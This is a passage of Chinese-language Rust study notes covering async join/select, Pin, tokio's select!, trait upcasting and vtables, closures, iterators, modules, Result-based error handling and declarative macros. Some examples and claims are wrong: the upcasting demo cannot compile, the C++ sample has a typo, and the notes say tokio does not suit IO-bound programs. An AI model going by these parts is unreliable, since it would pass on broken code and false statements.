<p>当我们写下这样的代码的时候，函数a，b的执行还是串行的。不过有时候，可能b不依赖于a的结果，他们之间的执行顺序没有任何关系。这个时候，我们就有<code>join!</code>，他可以同时异步执行若干个任务，并等待所有任务执行完成。目前他还没有在标准库稳定下来，我们也可以通过第三方库<code>future</code>使用join。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span>#![feature(future_join, future_poll_fn)]

<span class="boring">fn main() {
</span>use std::future::join;

async fn one() -&gt; usize { 1 }
async fn two() -&gt; usize { 2 }

let x = join!(one(), two()).await;
assert_eq!(x, (1, 2));
<span class="boring">}
</span></code></pre></pre>
<p>或者，同时异步执行若干个任务，并等待所有任务执行完成，但是如果中间有一个任务出错了就立即返回，可以用<code>try_join</code>.</p>
<p>或者，我们想执行若干个任务，但是每次一个任务执行完成都会返回，可以用<code>select</code>。</p>
<h2 id="pinunpin"><a class="header" href="#pinunpin">Pin/Unpin</a></h2>
<p><code>Unpin</code>是一个<strong>标记特征</strong>，不需要我们实现。它表明一个类型可以随意被移动，默认情况下，Rust 中的所有类型都是可移动的。Rust 允许按值传递所有类型，以及常见的智能指针类型。</p>
<p>那之前很多地方出现了<code>Pin</code>类型，他是什么？它是一个智能指针。他的作用是，让<strong>指针指向的对象的内存位置不会移动</strong>。一个常见的场景是<strong>自引用结构</strong>，也就是一个包含了指向自己的指针的对象。显然，如果自引用结构的内存位置移动了，那么指向自己的指针就失效了，再去使用指针就会产生Undefined behavior。如下</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 我们需要把这个类型标记成Unpin，然后把他Pin住。
// 或者写Unsafe
struct SelfRef {
    name: String,
    p_name: *const String,
}
<span class="boring">}
</span></code></pre></pre>
<p>所以，<code>Pin&lt;P&gt;</code>类型的语义就是，让<strong>指针P</strong>指向的对象，有固定的内存位置，不会被移动，直到内存释放。我们说这个对象&quot;pinned&quot;。不过，<strong>Pin语义只对真的不能被移动的类型的指针有效</strong>，也就是被<code>!Unpin</code>标记的类型，比如<code>Pin&lt;&amp;mut u8&gt;</code>，u8是被<code>Unpin</code>标记的，所以<code>Pin&lt;&amp;mut u8&gt;</code>并不会产生效果。</p>
<h2 id="tokio"><a class="header" href="#tokio">tokio</a></h2>
<p>显然，光有一个Future是远远不能实现异步执行的。要想真正发挥出异步的优势，我们要合理的调度Future。这便是**异步运行时(asynchronous runtime)**要做的工作。而<a href="https://tokio.rs/tokio/tutorial">tokio</a>就是现在最主流、开发最活跃的异步运行时。不过，它的应用场景不包括CPU-bound和IO-bound的程序，在他的主页上提及。Tokio提供了相当多的异步支持，包括管道、IO、信号、网络等。</p>
<h3 id="select-2"><a class="header" href="#select-2"><a href="https://docs.rs/tokio/latest/tokio/macro.select.html">select!</a></a></h3>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>select!{
    &lt;pattern&gt; = &lt;async expression&gt; , if &lt;precondition&gt; =&gt; &lt;handler&gt;,
    &lt;pattern&gt; = &lt;async expression&gt; , if &lt;precondition&gt; =&gt; &lt;handler&gt;,
    else =&gt; &lt;expression&gt;
}
<span class="boring">}
</span></code></pre></pre>
<ol>
<li>Evaluate all provided <code>&lt;precondition&gt;</code> expressions. If the precondition returns <code>false</code>, disable the branch for the remainder of the current call to <code>select!</code>. Re-entering <code>select!</code> due to a loop clears the “disabled” state.</li>
<li>Aggregate the <code>&lt;async expression&gt;</code>s from each branch, including the disabled ones. If the branch is disabled, <code>&lt;async expression&gt;</code> is still evaluated, but the resulting future is not polled.</li>
<li><strong>Concurrently(not  parallelly)</strong> await on the results for all remaining <code>&lt;async expression&gt;</code>s.</li>
<li>Once an <code>&lt;async expression&gt;</code> returns a value, attempt to apply the value to the provided <code>&lt;pattern&gt;</code>, if the pattern matches, evaluate <code>&lt;handler&gt;</code> and return. If the pattern <strong>does not</strong> match, disable the current branch and for the remainder of the current call to <code>select!</code>. Continue from step 3.</li>
<li>If <strong>all</strong> branches are disabled, evaluate the <code>else</code> expression. If no else branch is provided, panic.</li>
</ol>
<p>当一个分支成功执行后返回，其余的分支被抛弃。所以所有的分支需要cancellation safe。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="casting"><a class="header" href="#casting">Casting</a></h1>
<p>在完全面向对象语言中，Casting（转型）是比较容易理解的，简单的说：</p>
<ul>
<li>指向子类对象的父类引用赋给子类引用叫downcasting（向下转型）。</li>
<li>子类引用转换成父类引用叫做upcasting（向上转型）。</li>
</ul>
<p>显然，向上转型是简单的，向下转型的话，你需要保证父类引用他真的指向子类对象，才是安全的。</p>
<p>那么，在没有继承的Rust中，也有转型吗？是的，因为其实我们有trait，trait是有继承概念的。</p>
<h2 id="demo-1-了解trait继承"><a class="header" href="#demo-1-了解trait继承">Demo 1 了解trait继承</a></h2>
<pre><pre class="playground"><code class="language-rust">trait Base {}
trait Derived : Base {}
struct T;
impl Derived for T {}

fn main() {
	
}
</code></pre></pre>
<p>如果尝试编译上面的代码，会得到下面的错误。意思是，我们要为<code>T</code>实现<code>Derived</code>，就必须先为<code>T</code>实现<code>Base</code>。也就是说，<code>trait Derived : Base</code>的意思是，要实现<code>Derived</code>的前提是实现<code>Base</code>。</p>
<pre><code>error[E0277]: the trait bound `T: Base` is not satisfied
 --&gt; src/main.rs:4:6
  |
4 | impl Derived for T {}
  |      ^^^^^^^ the trait `Base` is not implemented for `T`
  |
note: required by a bound in `Derived`
 --&gt; src/main.rs:2:17
  |
2 | trait Derived : Base {}
  |                 ^^^^ required by this bound in `Derived`

For more information about this error, try `rustc --explain E0277`.
</code></pre>
<h2 id="demo-2-了解traitobject"><a class="header" href="#demo-2-了解traitobject">Demo 2 了解TraitObject</a></h2>
<pre><pre class="playground"><code class="language-rust">use std::mem;

trait Derived {
    fn derive1(&amp;self);
    fn derive2(&amp;self);
}
struct T(usize, usize);
impl Derived for T {
    fn derive1(&amp;self) {
        println!(&quot;derived1&quot;);
    }
    fn derive2(&amp;self) {
        println!(&quot;derived2&quot;);
    }
}

fn test(p: &amp;dyn Derived) {
    let (data, vtable): (usize, usize) = unsafe { mem::transmute(p) };
    println!(&quot;TraitObject    [data:0x{:x}, vtable:0x{:x}]&quot;, data, vtable);
    unsafe {
        // 使用as执行强制类型转换，将vtable从 `usize` 类型转为 `*const usize` 类型
        let v: *const usize = data as *const () as *const usize;
        // 打印出指针 v 指向的内存区间的值
        println!(
            &quot;data in data [{:x}, {:x}]&quot;,
            *v,
            *v.offset(1),
        );
    }
    unsafe {
        // 使用as执行强制类型转换，将vtable从 `usize` 类型转为 `*const usize` 类型
        let v: *const usize = vtable as *const () as *const usize;
        // 打印出指针 v 指向的内存区间的值
        println!(
            &quot;data in vtable [{:x}, {:x}, {:x}, {:x} {:x}]&quot;,
            *v,
            *v.offset(1),
            *v.offset(2),
            *v.offset(3),
            *v.offset(4),
        );
    }
}
fn main() {
    let t = T(1, 2);
    println!(&quot;{:x} {:x}&quot;,T::derive1 as usize,T::derive2 as usize);
    test(&amp;t);
}
</code></pre></pre>
<p><img src="Language/Rust/Basic/../images/traitobj.drawio.svg" alt="vptr" /></p>
<h2 id="demo-3-向上转型"><a class="header" href="#demo-3-向上转型">Demo 3 向上转型</a></h2>
<p>向上转型在目前的编译器中还是不稳定的特性，我们需要通过添加feature和allow incomplete feature来通过编译。</p>
<pre><pre class="playground"><code class="language-rust">#![feature(trait_upcasting)]
#![allow(incomplete_features)]

trait Base {
    fn base(&amp;self);
}
trait Derived: Base {
    fn derive1(&amp;self);
    fn derive2(&amp;self);
}
struct T;
impl Derived for T {
    fn derive1(&amp;self) {
        println!(&quot;derived1&quot;);
    }
    fn derive1(&amp;self) {
        println!(&quot;derived1&quot;);
    }
}
impl Base for T {
    fn base(&amp;self) {
        println!(&quot;base&quot;);
    }
}

fn test1(a: &amp;dyn Base) {
    a.base();
}
fn test2(b: &amp;dyn Derived) {
    b.derive();
    test1(b);
}

fn main() {
    let dr = T {};
    test2(&amp;dr);
}
</code></pre></pre>
<p>我们回顾一下C++是如何实现向上转型的，这在C++中是一件很自然的事情。</p>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
struct Base {
    long b;
    virtual void func() { printf(&quot;base\n&quot;); };
};
struct Derived : Base {
    log d;
    void func() { printf(&quot;derived\n&quot;); }
};

void test(struct Base *b) { b-&gt;func(); }

int main() {
    struct Derived derived = Derived();
    struct Derived derived2 = Derived();
    test(&amp;derived);
}
</code></pre>
<p>在C++中，<code>struct Base* b</code>他就是一个单纯的指针，<code>struct Derived* d</code>同理。他们多态的实现，是因为指针指向的区域中有个vptr指针，指向vtable，vtable中是各个函数真正的地址。</p>
<p>这样实现向上转型，不用考虑太多，直接执行vptr指向的vtable的函数指针就好了。也就是说，上面<code>test</code>的逻辑，也可以当做其实是<code>(b-&gt;vptr)[0]()</code>，执行的是虚函数表的函数指针，需要进过两次指针的寻址。</p>
<p><img src="Language/Rust/Basic/../images/vptr.drawio.svg" alt="vptr" /></p>
<p>然而在Rust中，对象本身不包括指向虚函数表的指针。</p>
<p>trait object是一个胖指针，可以认为他有两个元素。第一个元素是指向真实数据的指针，第二个元素是指向vtable的指针，如同上面介绍的一样。那么如果我们需要实现向上转型，参考<a href="https://rust-lang.github.io/dyn-upcasting-coercion-initiative/design-discussions/vtable-layout.html">https://rust-lang.github.io/dyn-upcasting-coercion-initiative/design-discussions/vtable-layout.html</a>。</p>
<h2 id="demo-3-向下转型"><a class="header" href="#demo-3-向下转型">Demo 3 向下转型</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="迭代器和闭包"><a class="header" href="#迭代器和闭包">迭代器和闭包</a></h1>
<p>下面的内容写于我对函数式编程还一无所知的时候。</p>
<p>闭包（Closures），一个可以储存在变量里的类似函数的结构。迭代器（Iterators），一种处理元素序列的方式。</p>
<h2 id="闭包-2"><a class="header" href="#闭包-2">闭包</a></h2>
<pre><code>fn  add_one_v1   (x: u32) -&gt; u32 { x + 1 }
let add_one_v2 = |x: u32| -&gt; u32 { x + 1 };
let add_one_v3 = |x|             { x + 1 };
let add_one_v4 = |x|               x + 1  ;
</code></pre>
<p>第一行展示了一个函数定义，而第二行展示了一个完整标注的闭包定义。第三行闭包定义中省略了类型注解，而第四行去掉了可选的大括号，因为闭包体只有一行。这些都是有效的闭包定义，并在调用时产生相同的行为。</p>
<h3 id="用途"><a class="header" href="#用途">用途</a></h3>
<ol>
<li>可以创建一个存放闭包和调用闭包结果的结构体。该结构体只会在需要结果时执行闭包，并会缓存结果值，这样余下的代码就不必再负责保存结果并可以复用该值。你可能见过这种模式被称 memoization 或 lazy evaluation （惰性求值）。有示例代码，但是有局限性。</li>
<li>闭包可以获得环境中的值。闭包可以通过三种方式捕获其环境，他们直接对应函数的三种获取参数的方式：获取所有权，可变借用和不可变借用。这三种捕获值的方式被编码为如下三个 <code>Fn</code> trait：
<ul>
<li>FnOnce 消费从周围作用域捕获的变量，闭包周围的作用域被称为其 环境，environment。为了消费捕获到的变量，闭包必须获取其所有权并在定义闭包时将其移动进闭包。其名称的 Once 部分代表了闭包不能多次获取相同变量的所有权的事实，所以它只能被调用一次。</li>
<li>FnMut 获取可变的借用值所以可以改变其环境</li>
<li>Fn 从其环境获取不可变的借用值</li>
</ul>
</li>
</ol>
<h2 id="迭代器"><a class="header" href="#迭代器">迭代器</a></h2>
<p>Rust中的迭代器是惰性的，在使用它之前不会有什么开销。
迭代器都实现了一个叫做 <code>Iterator</code> 的定义于标准库的 trait。这个 trait 的定义看起来像这样：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Iterator {
    type Item;
    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt;;
    ...
}
<span class="boring">}
</span></code></pre></pre>
<p>next 是 Iterator 实现者被要求定义的唯一方法。next 一次返回迭代器中的一个项，封装在 Some 中，当迭代器结束时，它返回 None。要自己实现 Iterator Trait，只需要自己实现<code>fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt;</code>这个方法，还有一些方法比如<code>last</code>,<code>count</code>等是已经实现的，你当然可以重载他，不过没必要。</p>
<h3 id="迭代器用途"><a class="header" href="#迭代器用途">迭代器用途</a></h3>
<p>可以和for一起用</p>
<p>**consuming adaptors: ** <code>fold</code> <code>collect</code> <code>any</code>，返回的不是迭代器了。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Tests if any element of the iterator matches a predicate.
fn any&lt;F&gt;(&amp;mut self, f: F) -&gt; bool
where
    F: FnMut(Self::Item) -&gt; bool, 

// Folds every element into an accumulator by applying an operation, returning the final result.
fn fold&lt;B, F&gt;(self, init: B, f: F) -&gt; B
where
    F: FnMut(B, Self::Item) -&gt; B,

// Transforms an iterator into a collection.
fn collect&lt;B&gt;(self) -&gt; B
where
    B: FromIterator&lt;Self::Item&gt;, 
<span class="boring">}
</span></code></pre></pre>
<p>我们可以看一下fold的源代码，我觉得用fold就可以实现其他的消费器了。本质上还是一个循环。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn fold&lt;B,F&gt;(mut self, init: B,mut f:F) -&gt; B
where 
Self: Sized,
F: FnMut(B, Self::Item) -&gt; B,
{
    let mut accum = init;
    while let Some(x) = self.next() {
        accum = f(accum,x);
    }
    accum
}
// try_fold 和标准库的实现不一样但是一个意思
fn simple_try_fold&lt;A, T, R: Try&lt;Output = A&gt;&gt;(
    iter: impl Iterator&lt;Item = T&gt;,
    mut accum: A,
    mut f: impl FnMut(A, T) -&gt; R,
) -&gt; R {
    for x in iter {
        accum = f(accum, x)?;
    }
    R::from_output(accum)
}
<span class="boring">}
</span></code></pre></pre>
<p>**iterator adaptors: ** <code>map</code> <code>filter</code>，返回的仍然是一个迭代器。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>//通过一个函数闭包来筛选迭代器的内容。
fn filter&lt;P&gt;(self, predicate: P) -&gt; Filter&lt;Self, P&gt;
where
    Self: Sized,
    P: FnMut(&amp;Self::Item) -&gt; bool, 

//对迭代器的每一个内容执行函数闭包，
fn map&lt;B, F&gt;(self, f: F) -&gt; Map&lt;Self, F&gt;
where
    Self: Sized,
    F: FnMut(Self::Item) -&gt; B, 
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="crates-and-modules"><a class="header" href="#crates-and-modules">Crates and Modules</a></h1>
<blockquote>
<p>当你编写大型程序时，组织你的代码显得尤为重要，因为你想在脑海中通晓整个程序，那几乎是不可能完成的。通过对相关功能进行分组和划分不同功能的代码，你可以清楚在哪里可以找到实现了特定功能的代码，以及在哪里可以改变一个功能的工作方式。</p>
<p>Rust 有许多功能可以让你管理代码的组织，包括哪些内容可以被公开，哪些内容作为私有部分，以及程序每个作用域中的名字。这些功能。这有时被称为 “模块系统（the module system）”，包括：</p>
<ul>
<li><strong>包</strong>（<em>Packages</em>）： Cargo 的一个功能，它允许你构建、测试和分享 crate。</li>
<li><strong>Crates</strong> ：一个模块的树形结构，它形成了库或二进制项目。</li>
<li><strong>模块</strong>（<em>Modules</em>）和 <strong>use</strong>： 允许你控制作用域和路径的私有性。</li>
<li><strong>路径</strong>（<em>path</em>）：一个命名例如结构体、函数或模块等项的方式</li>
</ul>
</blockquote>
<h2 id="module"><a class="header" href="#module">module</a></h2>
<p>module系统有点类似于Unix中的路径系统. 假设我们的文件结构是这样的, 文件内就是一个简单的函数.</p>
<pre><code>src
├── aaa.rs ── fn aaa() {};
├── main.rs ── fn main() {};
└── trap
    ├── bbb.rs ── fn bbb() {};
    └── mod.rs ── fn modd() {};
</code></pre>
<p>你需要在<strong>父节点显式的声明子节点</strong>. 什么意思呢? </p>
<ul>
<li>我需要在<code>main.rs</code>中加入<code>mod aaa</code>表示有<code>aaa</code>这个子模块.  <strong>一个文件就是一个模块</strong>. 一个文件名就是模块名.</li>
<li>我需要在<code>main.rs</code>中加入<code>mod trap</code>表示有<code>trap</code>这个子模块. <strong>一个文件夹也是一个模块</strong>. <code>mod.rs</code>这个名字是特殊的. 当我们建立一个文件夹中包含<code>mod.rs</code>这个文件时, <code>mod.rs</code>表示的就是这个文件夹名的模块. 在上面的目录结构中, 就是<code>mod.rs -&gt; trap</code></li>
<li>我需要在<code>mod.rs</code>中加入<code>mod bbb</code>表示<code>trap</code>有<code>bbb</code>这个子模块.</li>
</ul>
<p>所以, 模块的树形结构是</p>
<pre><code>crate
├── aaa
└── trap
    └── bbb
</code></pre>
<h3 id="索引"><a class="header" href="#索引">索引</a></h3>
<p>所以我们应该如何索引到我们需要的函数/结构/枚举呢? 还是类似Unix, 我们有相对路径和绝对路径. 我们用<code>crate</code>代表根路径(类似于<code>/</code>), 用<code>super</code>代表父目录(类似于<code>..</code>)。那么, 我们的根路径(crate root)是什么呢? 在默认情况下,就是<code>src/main.rs</code>或者<code>src/lib.rs</code>。 也就是说，如果需要使用main中定义的函数，可以使用<code>crate::func_main()</code>.</p>
<p>所以在<code>bbb()</code>中调用<code>mod()</code>就可以使用:</p>
<ul>
<li><code>super::modd()</code> 相对路径</li>
<li><code>crate::trap::modd()</code> 绝对路径.</li>
</ul>
<h3 id="可见性"><a class="header" href="#可见性">可见性</a></h3>
<pre><code>crate
├── main();
├── aaa
	└── aaa();
└── trap
	├── modd();
    └── bbb
    	└── bbb();
</code></pre>
<p>如果看了上面的介绍就直接去写Demo编译的话，很可能因为可见性的问题无法通过。因为<strong>模块内的元素默认是私有的</strong>，除了两个特殊情况，一个公有的<code>enum</code>中所有的值都是公有的，一个公有的<code>trait</code>中的字段是公有的。</p>
<ul>
<li>私有：只有本模块内的元素以及他的子模块可以访问它。</li>
<li>公有：在Rust中有5种关键字声明公有，https://doc.rust-lang.org/reference/visibility-and-privacy.html
<ul>
<li><code>pub</code>: makes an item visible to all. 你想导出的方法。</li>
<li><code>pub(crate)</code>: makes an item visible within the current crate. 比如你的一些想让整个库使用的辅助方法，但是又不想导出，就可以使用<code>pub (crate)</code>。</li>
<li><code>pub(self)</code>: makes an item visible to the current module. This is equivalent to <code>pub(in self)</code> or <strong>not using <code>pub</code> at all.</strong> 没卵用。</li>
<li><code>pub(super)</code>: makes an item visible to the parent module. This is equivalent to <code>pub(in super)</code>. </li>
<li><code>pub(in SimplePath)</code>: makes an item visible within the provided <code>path</code>. <code>path</code> must be an ancestor module of the item whose visibility is being declared. 和上面一起，让方法局限于某个mod。</li>
</ul>
</li>
</ul>
<h3 id="文件内的mod"><a class="header" href="#文件内的mod">文件内的mod</a></h3>
<p>文件内部也可以用来定义模块, 相当于又定义了一个子节点. 但是我不怎么喜欢这么写.</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>mod xxx{
    fn xx() {};
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="crate"><a class="header" href="#crate">crate</a></h2>
<p>crate是Rust的编译单元, 它形成了库或二进制项目. </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust-错误处理"><a class="header" href="#rust-错误处理">Rust-错误处理</a></h1>
<p>我觉得Rust的错误处理还是非常优雅的。</p>
<h2 id="result"><a class="header" href="#result">Result</a></h2>
<p>Result是错误处理的基础。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>result.unwrap();	    // 适合相信一定不会失败，或者写demo
result.expect(&quot;xxx&quot;);	// 适合失败了也没有办法处理，报个错panic
// 适合失败了也可以处理
if let Ok(x) = result {
    todo!();
} else {
    todo!();
}
result.unwrap_or();	// 失败了就给个默认值
<span class="boring">}
</span></code></pre></pre>
<p>根据编码规范的建议，应该在会出现错误的函数，以及会Panic的函数添加什么时候会出现错误的说明。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span>#![warn(clippy::missing_errors_doc)]
#![warn(clippy::missing_panics_doc)]

<span class="boring">fn main() {
</span>/// # Errors
///
/// Will return `Err` if ...
/// 
/// # Panics
///
/// Will panic if ...
pub fn read(filename: String) -&gt; io::Result&lt;String&gt; {
    unimplemented!();
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="-和-try"><a class="header" href="#-和-try">? 和 Try</a></h2>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Try: FromResidual&lt;Self::Residual&gt; {
    type Output;
    type Residual;
    fn from_output(output: Self::Output) -&gt; Self;
    fn branch(self) -&gt; ControlFlow&lt;Self::Residual, Self::Output&gt;;
}
pub enum ControlFlow&lt;B, C = ()&gt; {
    Continue(C),
    Break(B),
}
<span class="boring">}
</span></code></pre></pre>
<p>当我们在写<code>x?</code>的时候，其实我们的意思是。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// x: X
match x.branch() {
    ControlFlow::Continue(a) =&gt; a,
    ControlFlow::Break(a) =&gt; return X::from_output(a)
}
<span class="boring">}
</span></code></pre></pre>
<p>最常见的是和<code>Result</code>一起使用。不难知道<code>Result</code>应该实现了<code>Try</code> Trait. 下面是实现代码。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 和标准库有出入https://doc.rust-lang.org/src/core/result.rs.html#1893-1900
impl &lt;T,E&gt; ops::Try for Result&lt;T,E&gt; {
    type Output = T;
    type Residual = Result&lt;convert::Infallible, E&gt;;
    
    fn from_output(output: Self::Output) -&gt; Self {
        Ok(output)
    }
    
    fn branch(self) -&gt; ControlFlow&lt;Self::Residual, Self::Output&gt; {
        match self {
            Ok(v) =&gt; ControlFlow::Continue(v),
            Err(e) =&gt; ControlFlow::Break(Err(e))
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>需要注意的是，<code>?</code>表达式返回的错误类型需要和函数参数匹配，不是所有的返回Result的函数都能用<code>?</code>一把梭。虽然你可以用<code>Result&lt;T,Box&lt;dyn Error&gt;&gt;</code>，但这样并不好。可以用下面介绍的函数式做一些处理。</p>
<p>如果为了省事，可以用<a href="Language/Rust/Basic/../RustCrate/Anyhow.html">Anyhow</a>这个库。你就可以随便用<code>?</code>了。</p>
<h2 id="函数式处理"><a class="header" href="#函数式处理">函数式处理</a></h2>
<p>下面是一系列“语法糖”，其实都可以用match做进一步的处理。比如有下面四个</p>
<div class="table-wrapper"><table><thead><tr><th>方法</th><th>原型</th><th>说明</th></tr></thead><tbody>
<tr><td>and</td><td><code>pub fn and&lt;U&gt;(self, res: Result&lt;U, E&gt;) -&gt; Result&lt;U, E&gt;</code></td><td>Returns <code>res</code> if the result is <a href="https://doc.rust-lang.org/std/result/enum.Result.html#variant.Ok"><code>Ok</code></a>, otherwise returns the <a href="https://doc.rust-lang.org/std/result/enum.Result.html#variant.Err"><code>Err</code></a> value of <code>self</code>.</td></tr>
<tr><td>and_then</td><td><code>pub fn and_then&lt;U, F&gt;(self, op: F) -&gt; Result&lt;U, E&gt; where F: FnOnce(T) -&gt; Result&lt;U, E&gt;, </code></td><td>Calls <code>op</code> if the result is <a href="https://doc.rust-lang.org/std/result/enum.Result.html#variant.Ok"><code>Ok</code></a>, otherwise returns the <a href="https://doc.rust-lang.org/std/result/enum.Result.html#variant.Err"><code>Err</code></a> value of <code>self</code>.</td></tr>
<tr><td>or</td><td><code>pub fn or&lt;F&gt;(self, res: Result&lt;T, F&gt;) -&gt; Result&lt;T, F&gt;</code></td><td>Returns <code>res</code> if the result is <a href="https://doc.rust-lang.org/std/result/enum.Result.html#variant.Err"><code>Err</code></a>, otherwise returns the <a href="https://doc.rust-lang.org/std/result/enum.Result.html#variant.Ok"><code>Ok</code></a> value of <code>self</code>.</td></tr>
<tr><td>or_else</td><td><code>pub fn or_else&lt;F, O&gt;(self, op: O) -&gt; Result&lt;T, F&gt; where O: FnOnce(E) -&gt; Result&lt;T, F&gt;, </code></td><td>Calls <code>op</code> if the result is <a href="https://doc.rust-lang.org/std/result/enum.Result.html#variant.Err"><code>Err</code></a>, otherwise returns the <a href="https://doc.rust-lang.org/std/result/enum.Result.html#variant.Ok"><code>Ok</code></a> value of <code>self</code>.</td></tr>
</tbody></table>
</div>
<p><code>and</code>和<code>and_then</code>在语义上其实非常类似，如果是Ok的话再做进一步的处理。不过and的参数是进一步处理的<strong>结果</strong>，而and_then的参数是进一步处理的<strong>函数</strong>，也就是说and_then可以起到<strong>延迟计算</strong>的效果。如果and的进一步处理有一定的代价的时候，可以考虑选择and_then。<code>or</code>和<code>or_else</code>的关系也是完全类似的。</p>
<p>除此外还有<code>map</code>, <code>map_or</code>, <code>map_err</code>, <code>mar_or_else</code>, <code>unwrap</code>, <code>unwrap_or</code>, <code>unwrap_or_else</code>，可以帮你把错误处理处理出花儿来。</p>
<h2 id="自定义错误类型"><a class="header" href="#自定义错误类型">自定义错误类型</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="宏"><a class="header" href="#宏">宏</a></h1>
<p>学了编译原理，才算是对宏有了一定认识。C/C++的宏属于是在编译的第一阶段之前发挥作用，即从Byte Stream -&gt; Token Stream的过程。Rust的宏则在更深入的阶段发挥作用。事实上，只要对编译过程有一定了解，然后稍加训练记住规则，宏的编写并不那么困难。</p>
<p>编写过程宏，相当于Rust提供的库帮你做好了代码的解析，并且提供了结构化的数据将<strong>AST抽象语法树</strong>（其实过程宏是对Token Stream进行操作，但是一般我们都会用<code>syn</code>库将它解析成AST再进一步操作）提供给你，然后你利用Rust库提供的接口对AST进行进一步的操作。编写声明宏，则是用一个DSL，对输入的Token Stream进行操作。</p>
<p>Rust中的宏可以分成两类，使用 <code>macro_rules!</code> 的 <strong>声明</strong>（<em>Declarative</em>）宏，和三种 <strong>过程</strong>（<em>Procedural</em>）宏：</p>
<ul>
<li>声明宏，处理的对象是Token。他可以匹配不同的Token类型，然后将他们排列组合在加上自己的代码，可以认为是变成了新的Token序列，再放回Token Stream，然后进行Parse的过程。</li>
<li>过程宏，处理的对象也是Token。不过，他比声明宏复杂的多，他更像一个函数，以TokenStream为输入，通过处理，再变成其他的Token Stream。
<ul>
<li><strong>派生宏</strong>（Derive macro）：用于结构体（struct）、枚举（enum）、联合（union）类型，可为其实现函数或特征（Trait）。</li>
<li><strong>属性宏</strong>（Attribute macro）：用在结构体、字段、函数等地方，为其指定属性等功能。</li>
<li><strong>函数式宏</strong>（Function-like macro）：用法与普通的规则宏类似，但功能更加强大，可实现任意语法树层面的转换功能。</li>
</ul>
</li>
</ul>
<p>宏是一个还未完全稳定的特性，下面的东西在你看到的时候可能已经过时。另外，宏也可能是编译器内部实现的。</p>
<h2 id="声明宏"><a class="header" href="#声明宏">声明宏</a></h2>
<p>要理解声明宏，最重要的是知道<strong>在 AST 生成之后，宏处理过程才开始</strong>。过程宏一定是AST的一个完整的部分。提供给每次过程宏调用的参数，是一棵<strong>标记树 (token tree)</strong>。 具体来说，是一棵非叶节点的标记树： <code>(...)</code>、<code>[...]</code> 或 <code>{...}</code>。 </p>
<p>Rust 最常用的宏形式是 <strong>声明宏</strong>（<em>declarative macros</em>），形式如下：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>macro_rules! $name {
    ($pattern0) =&gt; ($expansion0) ;
    ($pattern1) =&gt; ($expansion1) ;
	...
}
<span class="boring">}
</span></code></pre></pre>
<p><code>name</code>是宏的名称。 <code>$pattern</code> 代表每个匹配规则的模式，<code>$expansion</code>代表与模式相应的展开代码。<code>pattern</code>的编写有一点像正则表达式，详见下面的例子：</p>
<ul>
<li>不过匹配的不是字母而是各种语法元素（详见下面的<strong>捕获类型</strong>）。</li>
<li>分隔符的匹配就像正则表达式中字符的匹配。</li>
<li>也可以使用<code>*</code>和<code>+</code>来表示重复零次及以上和重复一次及以上。</li>
</ul>
<h3 id="demo-4"><a class="header" href="#demo-4">Demo</a></h3>
<p>看一个例子，来自于《Rust编程之道》</p>
<pre><pre class="playground"><code class="language-rust">macro_rules! unless {
    ($arg:expr, $branch:expr) =&gt; {
        if !$arg {$branch};
    };
}
fn main() {
    let (a,b) = (0,1);
    unless!(a&gt;b,{
        println!(&quot;{} &lt; {}&quot;,a,b);
    });
}
</code></pre></pre>
<p>在这个例子中的<code>$pattern</code>就是<code>($arg:expr, $branch:expr)</code>。像<code>$arg:expr</code>这样的格式，<code>$arg</code>为捕获变量，必须以<code>$</code>开头；<code>expr</code>代表捕获类型为表达式类型。这里的<code>,</code>和<code>()</code>其实都是字符串而已，如果你把他们换成<code>;</code>和<code>[]</code>会发现其实也是一样的，当然main函数中对应的使用宏的地方要换掉。在main函数中 <code>arg =&gt; a&gt;b</code> <code>branch =&gt; println!(“{}&lt;{}”,a,b);</code></p>
<h3 id="捕获类型"><a class="header" href="#捕获类型">捕获类型</a></h3>
<p>除了expr，捕获类型是如下类型之一：</p>
<ul>
<li><code>item</code>， 代表语言项，就是组成一个 Rust 包的基本单位，比如模块、声明、函数定义 、类型定义、结构体定义、 imp!实现等。</li>
<li><code>block </code>，代表代码块，由花括号限定的代码。</li>
<li><code>stmt</code>，代表语句 ， 一般是指以分号结尾的代码 。</li>
<li><code>expr</code>，指代表达式，会生成具体的值 。</li>
<li><code>pat</code>，指代模式 。</li>
<li><code>ty</code> ，表示类型。</li>
<li><code>ident </code>，指代标识符。</li>
<li><code>path</code> ，指代路径， 比如 foo 、 std: : iter等。</li>
